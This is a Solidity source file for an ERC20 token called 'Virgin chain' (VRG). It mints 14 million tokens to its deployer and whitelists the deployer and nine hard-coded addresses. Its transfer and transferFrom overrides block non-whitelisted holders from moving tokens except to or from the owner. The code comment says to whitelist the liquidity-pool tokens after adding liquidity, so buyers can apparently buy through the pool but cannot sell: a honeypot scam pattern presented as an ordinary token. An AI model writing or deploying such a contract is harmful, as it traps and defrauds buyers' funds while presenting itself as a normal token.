// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Virgin chain", "VRG") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 14000000 * 10 ** decimals());
        whiteList[0x162Ba2b3092caC46A90B41b9313551b8D7657c81]= true;
        whiteList[0x3Acd1Ad0050056286678f56fd1C9F54541c8d747]=true;
        whiteList[0x99193EA9a729e83B6e51A1C0D4DE26ED9E30915c]=true;
        whiteList[0xf1a54b2fA39dE05228065903B9b4D4cD045E7Bcb]=true;
        whiteList[0x6B975f6F97fa1779ce77Bb1dadF1D7444938D712]=true;
        whiteList[0xB2f7A45759E6C3bc32836b04675E1e1CCEaD4bfA]=true;
        whiteList[0x827555913d6b48aeF41159A4A6F37f64F868e302]=true;
        whiteList[0x0bF85b1A70Bc23736e197481875c754fde2F1F9D]=true;
        whiteList[0x155CA108001D845a9a4F011C7a8Df2f3E728bdAA]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}